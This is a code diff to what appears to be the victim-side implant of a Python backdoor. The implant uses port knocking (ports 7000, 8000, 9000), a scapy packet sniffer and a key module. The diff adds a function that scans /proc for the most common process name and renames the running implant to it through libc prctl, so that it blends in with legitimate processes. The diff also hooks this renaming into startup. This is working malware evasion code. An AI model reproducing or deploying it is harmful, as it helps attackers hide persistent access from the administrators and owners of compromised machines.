@@ -12,9 +12,9 @@ import threading
 import time
 from dataclasses import dataclass, field
 from datetime import datetime
-
+import ctypes
+from collections import Counter
 from scapy.all import AsyncSniffer, ICMP, IP, TCP
-
 import keys
 
 KNOCK_PORTS = (7000, 8000, 9000)
@@ -1248,13 +1248,66 @@ def run_program(ctx: Context):
         send_socket.close()
 
 
+def rename_process():
+    """Rename this process to the most common process name found on the system"""
+    
+    print("Renaming process...")
+    print(f"  Current process PID: {os.getpid()}")
+    
+    try:
+        with open(f"/proc/{os.getpid()}/comm", "r") as f:
+            current_name = f.read().strip()
+            print(f"  Current process name: {current_name}")
+    except:
+        pass
+    
+    names = []
+    for entry in os.listdir("/proc"):
+        if not entry.isdigit():
+            continue
+        try:
+            with open(f"/proc/{entry}/comm", "r") as f:
+                name = f.read().strip()
+                if name:
+                    names.append(name)
+        except (OSError, PermissionError, FileNotFoundError):
+            pass
+    
+    if not names:
+        print("  No process names found!")
+        return
+    
+    name_counts = Counter(names)
+    top_3 = name_counts.most_common(3)
+    print("  Top 3 process names:")
+    for name, count in top_3:
+        print(f"    {name}: {count} time(s)")
+    
+    most_common = name_counts.most_common(1)[0][0]
+    print(f"  Renaming this process to: {most_common}")
+    
+    name_bytes = most_common.encode('utf-8')[:15]
+    libc = ctypes.CDLL("libc.so.6")
+    libc.prctl(15, name_bytes, 0, 0, 0)
+    
+    try:
+        with open(f"/proc/{os.getpid()}/comm", "r") as f:
+            final_name = f.read().strip()
+            print(f"  New process name: {final_name}")
+            print(f"  PID: {os.getpid()}")
+    except:
+        print(f"  Final name: {most_common}")
+        print(f"  PID: {os.getpid()}")
+
+
 if __name__ == "__main__":
     print("----------------- VICTIM -----------------")
+    rename_process() 
     ctx = Context()
     parse_arguments(ctx)
     handle_arguments(ctx)
 
-    print(f"Interface: {ctx.iface or 'default'}")
+    #print(f"Interface: {ctx.iface or 'default'}")
 
     while not ctx.stop_requested.is_set():
         print("\nWaiting for session...")
